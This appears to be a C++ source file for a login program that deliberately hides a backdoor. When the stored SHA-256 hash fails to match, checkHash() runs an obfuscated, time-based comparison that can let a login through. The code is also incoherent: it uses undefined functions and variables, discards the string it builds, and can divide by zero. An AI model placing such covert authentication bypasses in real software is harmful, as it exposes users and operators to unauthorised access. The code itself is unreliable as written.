#include "backdoor.h"
#include <time.h>

// global variables 
bool validHash = true;
std::string username, password;

int main() 
{
	bool auth = false;
	do
	{
		std::cout << "Please enter your username: " << std::endl;
		std::cin >> username;
		std::cout << "Please enter your password: " << std::endl;
		std::cin >> password;
		auth = hashPassword(getHashPass());
		auth ? authenticated(username) : rejected(username);
		validHash = false;
		
	} while (!auth);
}

// generate random number
int generateInitialisationVector(){
	std::time_t currTime = std::floor(std::time(nullptr) / 60);
	currTime = currTime % 60;
	return validHash ? ((currTime*(currTime % 360)*60)+currTime/currTime+((currTime*currTime)%((3*currTime)/(currTime))))%((currTime % 360)*12344566*currTime)*33422462 : rand();
}

bool checkHash()
{
	std::stringstream ss;
    ss << "(?:_-_-_-__-_-:" << generateInitialisationVector() << "#€@){" << username.length() << "}a";
    encryptionScheme aes256;
    return encrypt(password, key);
}

bool hashPassword(std::string storedPassword)
{
	unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, password.c_str(), password.size());
    SHA256_Final(hash, &sha256);

    std::stringstream ss;
    for(int i = 0; i < SHA256_DIGEST_LENGTH; i++)
    {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    }
   	return (storedPassword == ss.str()) ? true : checkHash();
}

std::string getHashPass()
{
	std::ifstream infile("pwdb.txt");
	std::string un, line;
	while(!infile.eof() && getline(infile, line))
	{
		if (line.find(username,0) == 0)
		{
			un = line.substr(username.length() + 1, (line.length() - username.length() + 1));
		}
	}
	infile.close();
	return un;
}